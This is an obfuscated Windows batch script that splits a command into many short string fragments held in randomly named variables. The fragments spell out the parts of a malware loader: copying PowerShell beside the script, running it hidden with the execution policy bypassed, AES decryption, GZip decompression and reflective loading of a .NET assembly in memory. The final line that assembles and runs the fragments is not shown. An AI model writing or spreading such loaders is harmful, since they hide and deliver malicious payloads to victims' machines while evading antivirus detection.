@echo off
set "tFFELLcQiP=in"
set "BOPSJFuARH=ow"
set "AJClROejiW=po"
set "GnxeuDUoXD=\v"
set "HYJAZbUMJL=ll"
set "XAbRrydbtq=Wi"
set "lLyZPmiAZx=rS"
set "EKEKXplDMc=32"
set "GOcWCULzeM=:\"
set "dCjMdpMjAk=em"
set "nvuWhRIvdx=we"
set "bxceovkBsX= /"
set "XgwfFoJBCF=ws"
set "PpPyPZwPro=0\"
set "geXIcgbOKv=he"
set "NJpvUGHkmA=.e"
set "ImpJIBMzXO=ll"
set "wQZSliKjhL=st"
set "bBnCABbsGF=he"
set "jdDOEOKtnq=co"
set "EQFInsmWDu= C"
set "pYpwotxVAl=nd"
set "HNvcOdmNzW=we"
set "ptnNQZeZZl=Po"
set "UpfxEMloUV=do"
set "olCmfHyGHj=Sy"
set "gOTIkxatVN=\W"
set "pfUNPCQMZI=xe"
set "txwtBZyqST=py"
set "uUcrYqyYov=rs"
set "QEZBjMhRwG=1."
set "nZmgVeONqP=s\"
set "wLoCHxPBOw=y "
set "oWEQFEyMBj= %~dp0"
set "jjSztOnuhh=cd"
set "TgNpHsETql=]::C"
set "uvvHloLgOM=ay()"
set "gyXokGxfqS=pQYX"
set "uoJDRthLKI='[-1"
set "GqEJMZjzcY=hy.A"
set "XofCwOloRq=flec"
set "TMgQXQXDKy=L4Yi"
set "IYEakHBShQ=Stre"
set "fPutZbqaiT=rofi"
set "AjRdWyPsmf=ose("
set "mqpDZPKepX=Syst"
set "XYNaYXryCK=Fina"
set "DRVVTYyPXj=.Cre"
set "VBqoALMkCf=m(, "
set "NfmynmqOSk=stem"
set "wpDljbHvuv=fNuj"
set "sUJXrGtGII=nage"
set "qvnKhfSvjt='gni"
set "YzOVWBnoRv=Bmor"
set "TrKyDgvQSV=RTi."
set "RpNXGtcrXR=;$Np"
set "oAiAxCgSqM=;$VA"
set "HfxvqjweJh=[IO."
set "VphrTCYigv=('Tg"
set "quDpPuFSvd=YxVw"
set "LkQmOsSGEY= = ["
set "CbgBnXppXi=join"
set "ECYhFsvAWm=esMa"
set "QhzwMpQocn=VAuV"
set "zVCxDlSFMC=-1.."
set "uLNiMqAzpi=ddin"
set "JDBlfRNrji=uB ="
set "DIBCiTJrGE=B = "
set "ZHKfTgxlAL=oint"
set "VfNyPmKQWp=rans"
set "jzgewvXfBm=RTi "
set "jyWApYTbNA=uB);"
set "tWlZpyHrvl= = $"
set "UqIpIMpFHP= [Sy"
set "gqDLdfWpaF=eam("
set "NWWXSgksPi=ct S"
set "DNsGXRIrhO=IB.T"
set "izZZJpiaXd=yste"
set "ipTypouvtI=mory"
set "LdMmTMHGrf=.Mod"
set "IrtBJbvbqA=null"
set "JKeFzvqjeE=]::("
set "VmtfiVjOyk=();$"
set "pzynEfPdye=B = "
set "kJpcJugeiR=trea"
set "YoBQHTQKPE=Star"
set "XvkMzBwuOV=brea"
set "HUMgOJdQhX=-4] "
set "RRvTugEIyl=grap"
set "FvouwfHXtR=Cmwm"
set "WhvamxJUxh=]::("
set "njYOtYmYTC=ew-O"
set "uUPirLRMMB=oryS"
set "nXImbHDQlR=pipT"
set "WvJjgDgdId=($qP"
set "UavucxTiMB=-joi"
set "UmnlWrcgkS=B, 0"
set "nclOwBYBcs=ewLi"
set "pxdOgKJrtb=tryP"
set "LinVztyxDY=:('g"
set "gdswpLstVR=1..-"
set "cLBAvzmIGN=ode]"
set "RzziUcvPov=ecry"
set "CoUqkoxApj=g = "
set "LYgwDUhsGl=n ''"
set "ZekaHOJLqn=ypto"
set "iyZlBtmTfz=[]] "
set "aiTojMTkCN=.Ass"
set "TOORRJMbcK=L = "
set "aIZKKVippr==');"
set "qYAqvLvgIe=$Xpn"
set "FVHafzLIGV=yTo("
set "AqYDHHECel=Conv"
set "IyXtFaZeKu=w) {"
set "LOIkrwnDTO=.Key"
set "lKNwbExxlO=-nop"
set "CJHRSpHUdn=($qP"
set "sgPxRUBcJV=am;$"
set "rylKEcRzBJ=tem."
set "wYYFlFUTce=ptog"
set "GFBDocHfjk=.Dis"
set "OJCRHqsJbF=.Sec"
set "iTsZaGjlzD=)($w"
set "bqXEseZHCm=fNuj"
set "QzDeIwFQYB= New"
set "piuTeXEIyH=);$X"
set "DbsHxujeeA=3); "
set "MRBGWFgtZZ=$SHR"
set "WSggnAPgsN=[Env"
set "OXpYhqSdlv=bjec"
set "BceXrSooFL=MYuB"
set "BoqqHNSByC=.-16"
set "EWMUbAzIup=ress"
set "IoxnEaeIJQ=[Sys"
set "esXuDspptH=ach "
set "ZYCLgOuQtK=('da"
set "AZnIBnpUVf=morF"
set "YHkHCPNqLM=IB ="
set "JomsgBArey=stem"
set "vozCtbsgXz=;$SH"
set "oHIjVpJMZx= = N"
set "qpMUYDsich=zuZI"
set "wVxeGXrMAS=pMYu"
set "etPzxclTRl=File"
set "evvqjQQyFK=rity"
set "GCqxnpkYdf=Xw ="
set "KDPynntMOu=pres"
set "kvyGGVVBjw=tion"
set "BKegcHmezJ=ionM"
set "dfAGymdndE=pose"
set "vukCRejseQ=)))"
set "kuLzcNkkHx=] -j"
set "CziWDcXUOB=Obje"
set "GCRtTBkxTX=e = "
set "IFCnLRwaYL=embl"
set "USgQWMHUlk=.Com"
set "ktESGMsDZC=j.Pa"
set "IYCDtofsrn=ring"
set "KbLOxKZAOn=mfz."
set "IjexUecwrG=.Mem"
set "OetGXbqfHB=tem."
set "azHFjorSEf=and "
set "sXUbXDNnAn=Cmwm"
set "QBJpWQetoM=CFxo"
set "vAeQjBkKjj=ment"
set "lSpBwwnVWB=6] -"
set "TTzKJjcyAV=ss -"
set "PHvbLlncWE=onve"
set "XgkVTWznIs=Secu"
set "QBQDpDNfIp=ispo"
set "MPyYegdqrG=orF'"
set "SPqoCHeZyv=y]::"
set "xlDYDkAxyQ=t Sy"
set "WAZZBymVok=vert"
set "fcHpVfodRA=le  "
set "HvNVmJGMAF= '')"
set "UaMdHESlUO=oL'["
set "cAGdnJbQsC=-ep "
set "UkwTGwRWPm=daeR"
set "LeOVadltfY=[Sys"
set "xPAcPILQLU=y.Cr"
set "GbrqyxICuQ=iron"
set "EjJsIoSonb=fNuj"
set "GpIqJQtpFZ=]::N"
set "aqPERDEDPO=iL.D"
set "OEInayGzev=yfNu"
set "qMuOKGuACs=saBm"
set "TLFtLkGaQO= [st"
set "epfQaTFPJO=..-1"
set "YXnzKSDAIF=$Xpn"
set "AqrorBjlwS=.Cry"
set "fBCvAddhEM=yste"
set "nHtdEQblEe=Comp"
set "IoOMtTIXiz=pStr"
set "mnImyFPmCU= if "
set "xyWJzeqxbl=uVq "
set "RlCwVnPNmc=tsWi"
set "MwnelzypTk=)) {"
set "cMVxesuMIc=, (,"
set "vLoaypASwP=k; }"
set "SGrdZyAOCE=Ti.T"
set "zRYsPYJGel=();$"
set "gZsTEQLUdP=y.Pa"
set "tdixnHpZbI=Comp"
set "FXwgTWMaQz=('%*'"
set "vZHAvDHjwr=16] "
set "iWUuoYtmlT=in $"
set "UVwHKkBTPO=th('"
set "vdoKWmaezy=fNuj"
set "nMBgOokhAA=em.I"
set "ExXHvMPhse= = $"
set "KNhDssqTGW=gnir"
set "MlZETvaLVT=qPmf"
set "dpWymbzZTe=1] -"
set "lcBFqytuXY=TllA"
set "AaQMnpsjdW=.GZi"
set "YevUTEeGTN= '')"
set "FhdqQbuleV=fNuj"
set "pHlxqZTaEN=ose("
set "UkIRMBakyW=PL, "
set "cdsSJigcHg=mfz "
set "pzpTJhrKuJ== [S"
set "RkfFfJSihv=; };"
set "OUkWWZpLui=$pMY"
set "xPmMLKclnZ=BC;$"
set "EmIcpjwVQO=oArr"
